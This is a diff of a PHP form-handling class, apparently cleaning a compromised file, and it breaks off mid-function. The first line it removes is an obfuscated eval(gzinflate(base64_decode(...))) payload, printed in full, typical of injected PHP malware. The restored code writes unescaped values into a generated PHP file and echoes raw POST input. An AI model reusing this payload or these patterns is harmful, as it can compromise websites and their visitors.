@@ -1,3 +1,805 @@
 <?php
-eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'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'\x29\x29\x29\x3B");
+class CForm extends CGeneral {
+    public $type;
+    public $showFieldErrorText = TRUE; //wether to show field error with th field
+    public $showFieldErrorColor = TRUE; //wether to show field error with th field
+    public $dontClose;
+    public $autoClean = TRUE;
+    private static $errors = array();
+    private $reference; //used in edit or update
+    private $action; //form action
+    private $config;
+    private $method;
+    private $labels = array();
+    private $validation = array();
+    //private $dontCheck; //don't check if field is not required
+    public function __construct($method = '') {
+        $this->method = $method;
+        $this->config = $this->getConfig('form', $method);
+        if (is_array($this->config)) {
+            $this->generateLabels();
+            $this->generateValidations();
+        }
+    }
+    private function generateLabels() {
+        $label = new CLabel($this->method);
+        foreach ($this->config as $field => $data) {
+            if (is_string($field)) {
+                if (isset($data['label'])) {
+                    $this->labels[$field] = $data['label'];
+                } else {
+                    $this->labels[$field] = $label->getLabel($field);
+                }
+            }
+        }
+    }
+    private function generateValidations() {
+        foreach ($this->config as $name => $data) {
+            if (isset($data['validation'])) {
+                $this->validation[$name] = $data['validation'];
+            }
+        }
+    }
+    private function getLabel($field, $data = '') {
+        $result = '';
+        if (isset($data['label'])) {
+            $result = $data['label'];
+        } elseif (isset($this->labels[$field])) {
+            $result = $this->labels[$field];
+        }
+        if (isset($this->validation[$field])) {
+            if (is_array($this->validation[$field])) {
+                if (strpos($this->validation[$field][0], 'required') !== FALSE) {
+                    $result.= '<span class="error">*</span>';
+                }
+            } else {
+                if (strpos($this->validation[$field], 'required') !== FALSE) {
+                    $result.= '<span class="error">*</span>';
+                }
+            }
+        }
+        return $result;
+    }
+    public function run() {
+        if (!is_array($this->config)) {
+            return FALSE;
+        }
+        $body = '';
+        if (isset($this->config['reference'])) {
+            $this->reference = CView::getVar($this->config['reference']);
+        }
+        foreach ($this->config as $name => $data) //get the form elements.$name is the name of the element
+        {
+            if (is_int($name) && (!is_array($data))) {
+                $body.= $data;
+            } else {
+                if (is_array($data)) {
+                    if (!empty($data['type'])) {
+                        switch ($data['type']) {
+                            case 'form':
+                                $form = $this->beginForm($name, $data);
+                            break;
+                            case 'select':
+                                $body.= $this->select($name, $data);
+                            break;
+                            case 'textarea':
+                                $body.= $this->textarea($name, $data);
+                            break;
+                            case 'radio':
+                                $body.= $this->radio($name, $data);
+                            break;
+                            case 'captcha':
+                                $body.= $this->captcha($name, $data);
+                            break;
+                            case 'extra':
+                                $body.= $this->extra($name, $data);
+                            break;
+                            case 'checkbox':
+                                $body.= $this->checkbox($name, $data);
+                            break;
+                            case 'view_isset':
+                                $body.= CView::getVar($name);
+                            break;
+                            default:
+                                if ($name != 'reference') {
+                                    $body.= $this->makeField($name, $data);
+                                }
+                        }
+                    } else { //put sth I want, but I'd like to have the options!
+                        $decoration = TRUE;
+                        if (isset($data['decoration']) && $data['decoration'] === FALSE) $decoration = FALSE;
+                        if ($decoration === TRUE) {
+                            $body.= '<p><label for="' . $name . '">';
+                            $body.= $this->getLabel($name, $data);
+                            $body.= '</label>';
+                        }
+                        if (isset($data['value'])) {
+                            $body.= $data['value'];
+                        }
+                        if (!empty(self::$errors[$name])) {
+                            if (isset($data['showFieldErrorText']) && $data['showFieldErrorText'] != FALSE) {
+                                $body.= ' <sapn class="error">';
+                                $body.= self::$errors[$name];
+                                $body.= '</span>';
+                            } elseif ($this->showFieldErrorText !== FALSE) {
+                                $body.= ' <sapn class="error">';
+                                $body.= self::$errors[$name];
+                                $body.= '</span>';
+                            }
+                        }
+                    }
+                } elseif ($name != 'reference') {
+                    $body.= '<p><label for="' . $name . '">';
+                    $body.= $this->getLabel($name, $data);
+                    $body.= '</label>';
+                    $body.= $data;
+                    $body.= '</p>';
+                }
+            }
+        }
+        if (!isset($form)) {
+            $form = $this->beginForm();
+        }
+        $body = $form . $body;
+        if ($this->dontClose !== TRUE) $body.= '</form>';
+        return $body;
+    }
+    public function validate() //array('clerk_number'=>array('required,number'))
+    {
+        if (count($_POST) == 0) {
+            return FALSE;
+        }
+        if (!empty($this->validation)) {
+            $validator = new CValidator;
+            $db = new CDatabase;
+            foreach ($this->validation as $field => $data) {
+                $data = is_array($data) ? $data[0] : $data;
+                //don't check if $data is not required
+                if (stripos($data, 'required') === FALSE && empty($_POST[$field])) {
+                    //$this->dontCheck = TRUE;
+                    continue;
+                } else {
+                    //since its message has contact with other rules
+                    if (strpos($data, 'required') !== FALSE) {
+                        if (isset($_POST[$field])) {
+                            $result = $validator->required($_POST[$field]);
+                            if ($result === FALSE) {
+                                $message = $this->buildMessage('required', $field);
+                                $this->setError($field, $message);
+                            }
+                        } else {
+                            $message = $this->buildMessage('required', $field);
+                            $this->setError($field, $message);
+                        }
+                    }
+                    $field_rules = explode(',', $data);
+                    foreach ($field_rules as $rule) {
+                        $result = TRUE;
+                        $param = FALSE;
+                        $unit = FALSE;
+                        if ($this->getError($field) === FALSE) //$field has no error,i.e no 'required' error is set
+                        {
+                            if (($first_occurrence = strpos($rule, '[')) !== FALSE) {
+                                $ruleTempValue = substr($rule, 0, $first_occurrence);
+                                $length = ($ruleTempValue == 'pattern') ? (strrpos($rule, ']') - $first_occurrence - 1) : (strpos($rule, ']') - $first_occurrence - 1);
+                                $param = substr($rule, $first_occurrence + 1, $length);
+                                $unitStart = strrpos($rule, '[');
+                                if ($unitStart != $first_occurrence) {
+                                    $unit = substr($rule, $unitStart + 1, -1);
+                                }
+                                if (strpos($param, '$') !== FALSE && $ruleTempValue != 'pattern') {
+                                    $param = str_replace('$', '', $param);
+                                    $param = CView::getVar($param);
+                                }
+                                if (isset($unit) && strpos($unit, '$') !== FALSE) {
+                                    $unit = str_replace('$', '', $unit);
+                                    $unit = CView::getVar($unit);
+                                }
+                                $rule = $ruleTempValue;
+                            }
+                            if (method_exists($validator, $rule) === TRUE) {
+                                //these rules are in array mode
+                                if ($param !== FALSE) {
+                                    //maxLength,minLength,maxValue,minValue,length,match,pattern
+                                    if ($rule == 'unique') {
+                                        $result = $validator->unique($param, $field, $_POST[$field]);
+                                    } else {
+                                        $result = $validator->$rule($_POST[$field], $param);
+                                    }
+                                } else {
+                                    if ($rule == 'captcha') {
+                                        $result = $validator->captcha($field);
+                                    } else $result = $validator->$rule($_POST[$field]);
+                                }
+                            }
+                            if ($result === FALSE) {
+                                $message = $this->buildMessage($rule, $field, $param, $unit);
+                                $this->setError($field, $message);
+                            }
+                        } //if($this->getError($field) === FALSE)
+                        else {
+                            break;
+                        }
+                    } //foreach($field_rules as $rule)
+                    
+                }
+                if (empty(self::$errors[$field])) // there is no error,so we can do some cleaning
+                {
+                    $ac = TRUE;
+                    if (isset($this->validation[$field]['autoClean'])) $ac = $this->validation[$field]['autoClean'];
+                    elseif (isset($this->autoClean)) $ac = $this->autoClean;
+                    if ($ac) {
+                        if (isset($ac['trim'])) {
+                            if ($ac['trim'] !== FALSE) $_POST[$field] = trim($_POST[$field]);
+                        } else $_POST[$field] = trim($_POST[$field]);
+                        if (isset($ac['stripslashes'])) {
+                            if ($ac['stripslashes'] !== FALSE) $_POST[$field] = stripslashes($_POST[$field]);
+                        } else $_POST[$field] = stripslashes($_POST[$field]);
+                        if (isset($ac['escape'])) {
+                            if ($ac['escape'] !== FALSE) $_POST[$field] = $db->escape($_POST[$field]);
+                        } else $_POST[$field] = $db->escape($_POST[$field]);
+                        if (isset($ac['htmlentities'])) {
+                            if ($ac['htmlentities'] !== FALSE) $_POST[$field] = htmlentities($_POST[$field], ENT_QUOTES, "UTF-8");
+                        } else $_POST[$field] = htmlentities($_POST[$field], ENT_QUOTES, "UTF-8");
+                    }
+                }
+            }
+        } //if(! empty($this->validation))
+        if (empty(self::$errors)) return TRUE;
+        return FALSE;
+    }
+    private function buildMessage($rule, $field, $param = FALSE, $unit = FALSE) {
+        if (isset($this->validation[$field]['message'][$rule])) return $this->validation[$field]['message'][$rule];
+        if (file_exists(FRAMEWORK . 'messages/validation.php')) {
+            $message = require (FRAMEWORK . 'messages/validation.php');
+        }
+        if (isset($message[$rule])) {
+            $message = $message[$rule];
+        } else {
+            $message = '{{field}}, has error.';
+            if (PHP40::get()->debug === TRUE) {
+                $message.= 'PLEASE check if the file "validation.php" exists in the directory ' . FRAMEWORK . 'messages/';
+            }
+        }
+        $message = str_replace('{{field}}', $this->labels[$field], $message);
+        if ($param !== FALSE) {
+            if (isset($this->labels[$param])) {
+                $message = str_replace('{{value}}', $this->labels[$param], $message);
+            } else {
+                $message = str_replace('{{value}}', $param, $message);
+                if ($unit !== FALSE) {
+                    $message = str_replace('{{unit}}', $unit, $message);
+                } else {
+                    $message = str_replace('{{unit}}', '', $message);
+                }
+            }
+        }
+        return $message;
+    }
+    public function setError($field, $message) {
+        self::$errors[$field] = $message;
+    }
+    public function getError($field) {
+        if (empty(self::$errors[$field])) return FALSE;
+        else return self::$errors[$field];
+    }
+    public function getAllErrors() {
+        if (!empty(self::$errors)) {
+            $result = '<div class="red"><ul>';
+            foreach (self::$errors as $field => $message) {
+                $result.= '<li>' . $message . '</li>';
+            }
+            $result.= '</ul></div>';
+            return $result;
+        }
+        return FALSE;
+    }
+    public function beginForm($name = '', $data = '') {
+        $form = '<form';
+        if (!empty($name)) {
+            $form.= ' name="' . $name . '" id="' . $name . '"';
+        }
+        if (!empty($data['enctype'])) {
+            $form.= ' enctype="' . $data['enctype'] . '"';
+        }
+        if (!empty($data['method'])) {
+            $form.= ' method="' . $data['method'] . '"';
+        }
+        if (!empty($data['action'])) {
+            $form.= ' action="' . CUrl::createUrl($data['action']) . '"';
+        }
+        if (strpos($form, 'enctype') === FALSE && isset($this->type)) {
+            $form.= ' enctype="' . $this->type . '"';
+        }
+        if (strpos($form, 'method') === FALSE) {
+            $form.= ' method="post"';
+        }
+        if (strpos($form, 'action') === FALSE) {
+            if (isset($this->action)) {
+                $form.= ' action="' . $this->action . '"';
+            } elseif (isset($_SERVER['PATH_INFO'])) {
+                $form.= ' action="' . CUrl::createUrl($_SERVER['PATH_INFO']) . '"';
+            }
+        }
+        if (isset($data['in'])) $form.= ' ' . $data['in'];
+        if (isset($data['out'])) $form.= ' ' . $data['out'];
+        $form.= '>';
+        return $form;
+    }
+    public function captcha($name, $data) {
+        //$x = ROOT.FRAMEWORK.'core/captcha/CCaptcha.php';
+        //echo $x; echo '<br />'; $y = FRAMEWORK.'core/captcha/CCaptcha.php'; echo $y; exit();
+        $decoration = TRUE;
+        if (isset($data['decoration']) && $data['decoration'] === FALSE) $decoration = FALSE;
+        $flag = TRUE;
+        $body = '';
+        $path = ROOT . 'public/runtime/captcha.php';
+        $content = '<?php require_once("' . ROOT . FRAMEWORK . 'core/captcha/CCaptcha.php");$obj = new CCaptcha;';
+        foreach ($data as $key => $value) {
+            if (property_exists('CCaptcha', $key) === TRUE) $content.= '$obj->' . $key . '= \'' . $value . '\';';
+        }
+        $content.= '$obj->captchaField=\'' . $name . '\'; $obj->generateRandom(); 
+        require_once("' . ROOT . FRAMEWORK . 'core/CSession.php"); $session = new CSession;
+        $session->set("captcha",md5($obj->getCode())); $obj->generateImage();?>';
+        if (!$file = fopen($path, 'w')) {
+            $flag = FALSE;
+        } else {
+            if (fwrite($file, $content) === FALSE) {
+                $flag = FALSE;
+            }
+        }
+        if ($flag === TRUE) {
+            if ($decoration === TRUE) {
+                $body.= '<p><label>&nbsp;</label>';
+            }
+            $imgPath = PHP40::get()->homeUrl . 'public/runtime/captcha.php';
+            $body.= '<img src="' . $imgPath . '" alt="captcha" />';
+            if ($decoration === TRUE) {
+                $body.= '</p><p><label for="' . $name . '">کد امنیتی<span class="error">*</span></label>';
+            }
+            $body.= '<input type="text" name="' . $name . '" id="' . $name . '"  value="';
+            $temp = isset($data['post']) ? $data['post'] : TRUE;
+            if (isset($_POST[$name]) && $temp !== FALSE) {
+                $body.= $_POST[$name];
+            }
+            $body.= '"';
+            if (isset($data['in'])) {
+                $body.= ' ' . $data['in'];
+            }
+            if (!empty(self::$errors[$name])) {
+                $showFieldErrorColor = isset($data['showFieldErrorColor']) ? $data['showFieldErrorColor'] : $this->showFieldErrorColor;
+                if ($showFieldErrorColor) {
+                    $body.= ' style="background:#FFE3E4"';
+                }
+            }
+            $body.= ' />';
+            $showFieldErrorText = FALSE;
+            if (!empty(self::$errors[$name])) {
+                $showFieldErrorText = isset($data['showFieldErrorText']) ? $data['showFieldErrorText'] : $this->showFieldErrorText;
+                if ($showFieldErrorText) {
+                    $body.= ' <sapn class="error">';
+                    $body.= self::$errors[$name];
+                    $body.= '</span>';
+                    $showFieldErrorText = TRUE;
+                }
+            }
+            if (isset($data['out']) && $showFieldErrorText === FALSE) {
+                $body.= $data['out'];
+            }
+            if ($decoration === TRUE) $body.= '</p>';
+        } elseif (PHP40::get()->debug === TRUE) {
+            echo 'There was error in generating captch.';
+        }
+        return $body;
+    }
+    public function checkbox($name, $data) {
+        $decoration = TRUE;
+        if (isset($data['decoration']) && $data['decoration'] === FALSE) $decoration = FALSE;
+        $body = '';
+        if ($decoration === TRUE) {
+            $body.= '<p>';
+        }
+        $modelValue = '';
+        $post = TRUE;
+        if (isset($data['post'])) $post = $data['post'];
+        $values = '';
+        $default = '';
+        if (isset($data['value'])) {
+            $values = $data['value'];
+            if (isset($data['value']['default'])) $default = $data['value']['default'];
+        }
+        $postFlag = FALSE;
+        if (isset($_POST[$name]) && (!empty($post))) {
